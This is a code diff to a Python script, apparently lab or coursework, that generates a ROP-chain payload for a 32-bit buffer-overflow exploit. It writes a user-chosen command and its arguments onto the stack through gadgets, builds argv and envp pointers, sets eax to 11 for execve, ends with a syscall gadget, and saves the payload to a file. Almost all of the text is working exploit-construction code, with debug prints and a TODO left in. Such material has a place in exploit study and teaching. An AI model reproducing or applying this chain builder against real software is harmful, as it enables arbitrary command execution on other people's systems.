@@ -109,7 +109,6 @@ while True:
     print('pad: ', padding, '\n')
 
 STACKADDR = int(rop_gadgets['stackAddr'][0], 0)
-STACK = pack("<I", int(rop_gadgets['stackAddr'][0], 0))
 MOV = pack("<I", int(rop_gadgets['mov'][0], 0))
 POPDST = pack("<I", int(rop_gadgets['popDst'][0], 0))
 POPSRC = pack("<I", int(rop_gadgets['popSrc'][0], 0))
@@ -121,6 +120,32 @@ XORA = pack("<I", int(rop_gadgets['xorA'][0], 0))
 INCA = pack("<I", int(rop_gadgets['incA'][0], 0))
 SYS = pack("<I", int(rop_gadgets['sys'][0], 0))
 PAD = pack("<I", 0x46464646)
+
+# automatic 
+def setA(pointer):
+    buff = bytes('', 'ascii')
+    buff += XORA
+    buff += addPadding(rop_gadgets['xorA'][1], {'ebx': 0, 'ecx': pointer})
+
+    for _ in range(11):
+        buff += INCA
+        buff += addPadding(rop_gadgets['incA'][1], {'ebx': 0, 'ecx': pointer})
+    
+    return buff
+
+def pushNull(pointer):
+    buff = bytes('', 'ascii')
+    buff += POPDST
+    buff += pack("<I", STACKADDR + pointer)
+    buff += addPadding(rop_gadgets['popDst'][1], {})
+
+    buff += XORSRC
+    buff += addPadding(rop_gadgets['xorSrc'][1], {})
+
+    buff += MOV
+    buff += addPadding(rop_gadgets['mov'][1], {})
+    return buff
+
 
 def addPadding(gadget, regsSet):
     result = bytes('', 'ascii')
@@ -134,7 +159,7 @@ def addPadding(gadget, regsSet):
         if g[0] == 'pop':
             reg = g[1]
             try:
-                # print('TRY\n')
+                print('TRY\n')
                 # print('regSet: ', regsSet, '\n')
                 # print('reg: ',reg,'\n')
                 # print('w: ', regsSet[reg], '\n')
@@ -148,75 +173,175 @@ def addPadding(gadget, regsSet):
 command_line = input('Command: ').split()
 # print('cmd_line: ', command_line)
 exec = command_line[0]
-# print('cmd: ', command)
-right_length = len(exec) % 4
-if right_length != 0:
-    exec = '/' * (4 - right_length) + exec
-    print('com ', exec)
-
+args = command_line[1:]
+# print('args: ', args, '\n')
 
 # add initial padding
 p = bytes('A' * padding, 'ascii')
 
+# ===================================================================================
+# *filename section
+# ===================================================================================
+
 # we'll use this to point to the right location on stack
-pointer = 0
-# put stack address to the destination register which we got from the mov gadget
-print ('for: ', int(len(exec)/4))
+stack_addr_pointer = 0
+
+exec_correct_length = len(exec) % 4
+if exec_correct_length != 0:
+    exec = '/' * (4 - exec_correct_length) + exec
+    print('command: ', exec, '\n')
+
 for _ in range(int(len(exec)/4)):
     p += POPDST
-    p += pack("<I", STACKADDR + pointer)
+    p += pack("<I", STACKADDR + stack_addr_pointer)
     p += addPadding(rop_gadgets['popDst'][1], {})
 
     p += POPSRC
-    p += bytes(exec[pointer:pointer+4], 'ascii')
-    p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: pointer})
+    p += bytes(exec[stack_addr_pointer : stack_addr_pointer + 4], 'ascii')
+    p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: stack_addr_pointer})
 
     p += MOV
     p += addPadding(rop_gadgets['mov'][1], {})
-    pointer += 4
+    stack_addr_pointer += 4
+
+# push a NULL onto the stack after command is on stack 
+p += pushNull(stack_addr_pointer)
+stack_addr_pointer += 1
+
+# ===================================================================================
+# *argv[] section
+# ===================================================================================
+
+for i in range(len(args)):
+    arg = args[i]
+    arg_correct_length = len(arg) % 4
+    # print('args_size: ', arg_missing_length, '\n')
+    if arg_correct_length != 0:
+        arg += (4 - arg_correct_length) * 'A' # padding
+        print('arg: ', arg, '\n')
+
+    arg_size = int(len(arg)/4)
+    arg_pointer = 0
+
+    for j in range(arg_size):
+        print('arg_pointer: ', arg_pointer, '\n')
+        p += POPDST
+        p += pack("<I", STACKADDR + stack_addr_pointer)
+        p += addPadding(rop_gadgets['popDst'][1], {})
+
+        p += POPSRC
+        p += bytes(arg[arg_pointer : arg_pointer + 4], 'ascii')
+        p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: stack_addr_pointer})
+
+        p += MOV
+        p += addPadding(rop_gadgets['mov'][1], {})
+        arg_pointer += 4
+
+        print('stack_pointer_before: ', stack_addr_pointer, '\n')
+        if j == arg_size - 1 and arg_correct_length != 0:
+            stack_addr_pointer += arg_correct_length
+        else:
+            stack_addr_pointer += 4
+        print('stack_pointer_after: ', stack_addr_pointer, '\n')
+    print('point: ', stack_addr_pointer, '\n')
+    p += pushNull(stack_addr_pointer)
+    stack_addr_pointer += 1
+stack_addr_pointer -= 1
+
+# uncomment for working code 
 
 # p += POPDST
-# p += pack("<I", STACKADDR + 4)
+# # put stack address to the destination register which we got from the mov gadget
+# p += pack("<I", STACKADDR + stack_addr_pointer)
 # p += addPadding(rop_gadgets['popDst'][1], {})
 
 # p += POPSRC
-# p += bytes(exec[4:8], 'ascii')
-# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: 4})
+# p += b'-lpp'
+# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: stack_addr_pointer})
 
 # p += MOV
 # p += addPadding(rop_gadgets['mov'][1], {})
+# stack_addr_pointer += 2
 
+# print('point: ', stack_addr_pointer, '\n')
+# p += pushNull(stack_addr_pointer)
+# stack_addr_pointer += 1
+
+# p += POPDST
+# # put stack address to the destination register which we got from the mov gadget
+# p += pack("<I", STACKADDR + stack_addr_pointer)
+# p += addPadding(rop_gadgets['popDst'][1], {})
+
+# p += POPSRC
+# p += b'-app'
+# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: stack_addr_pointer})
+
+# p += MOV
+# p += addPadding(rop_gadgets['mov'][1], {})
+# stack_addr_pointer += 2
+
+# print('point: ', stack_addr_pointer, '\n')
+# p += pushNull(stack_addr_pointer)
+
+# ===================================================================================
+# *envp[] section
+# ===================================================================================
+
+# shadow stack
+shadow_pointer = 60
 p += POPDST
-p += pack("<I", STACKADDR + pointer)
+p += pack("<I", STACKADDR + shadow_pointer)
 p += addPadding(rop_gadgets['popDst'][1], {})
 
-p += XORSRC
-p += addPadding(rop_gadgets['xorSrc'][1], {})
+p += POPSRC
+p += pack('<I', STACKADDR)
+p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_pointer})
+
+p += MOV
+p += addPadding(rop_gadgets['mov'][1], {})
+shadow_pointer += 4
+
+p += POPDST
+p += pack("<I", STACKADDR + shadow_pointer)
+p += addPadding(rop_gadgets['popDst'][1], {})
+
+p += POPSRC
+p += pack('<I', STACKADDR + 9)
+p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_pointer})
+
+p += MOV
+p += addPadding(rop_gadgets['mov'][1], {})
+shadow_pointer += 4
+
+p += POPDST
+p += pack("<I", STACKADDR + shadow_pointer)
+p += addPadding(rop_gadgets['popDst'][1], {})
+
+p += POPSRC
+p += pack('<I', STACKADDR + 12)
+p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_pointer})
 
 p += MOV
 p += addPadding(rop_gadgets['mov'][1], {})
 
+# TODO: put a null after 
+
 p += POPB
-p += STACK
+p += pack("<I", STACKADDR)
 p += addPadding(rop_gadgets['popB'][1], {})
 
 p += POPC
-p += pack("<I", STACKADDR + pointer)
+p += pack("<I", STACKADDR + 60)
 p += addPadding(rop_gadgets['popC'][1], {'ebx': 0})
 
 p += POPD
-p += pack("<I", STACKADDR + pointer)
-p += addPadding(rop_gadgets['popD'][1], {'ebx': 0, 'ecx': pointer})
+p += pack("<I", STACKADDR + 14)
+p += addPadding(rop_gadgets['popD'][1], {'ebx': 0, 'ecx': stack_addr_pointer})
 
-p += XORA
-p += addPadding(rop_gadgets['xorA'][1], {'ebx': 0, 'ecx': pointer})
-
-for _ in range(11):
-    p += INCA
-    p += addPadding(rop_gadgets['incA'][1], {'ebx': 0, 'ecx': pointer})
+p += setA(stack_addr_pointer)
 
 p += SYS
 
-f = open('testNew', 'wb')
+f = open('auto', 'wb')
 f.write(p)
 f.close()
